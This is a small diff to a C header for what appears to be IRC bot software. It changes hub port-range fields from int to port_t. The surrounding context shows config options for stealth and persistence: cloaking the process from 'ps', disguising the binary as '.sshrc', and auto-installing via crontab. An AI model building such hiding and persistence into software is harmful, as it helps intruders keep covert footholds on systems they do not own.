@@ -3,6 +3,8 @@
 
 #include <sys/types.h>
 #include <stdio.h>
+#include "types.h"
+
 
 typedef struct conf_bot_b {
   struct conf_bot_b *next;
@@ -28,8 +30,8 @@ typedef struct conf_b {
   char *homedir;        /* homedir */
   int autouname;        /* should we just auto update any changed in uname output? */
   int pscloak;          /* should the bots bother trying to cloak `ps`? */
-  int portmin;          /* for hubs, the reserved port range for incoming connections */
-  int portmax;          /* for hubs, the reserved port range for incoming connections */
+  port_t portmin;       /* for hubs, the reserved port range for incoming connections */
+  port_t portmax;       /* for hubs, the reserved port range for incoming connections */
   char *binpath;        /* path to binary, ie: ~/ */
   char *binname;        /* binary name, ie: .sshrc */
   int autocron;         /* should the bot auto crontab itself? */
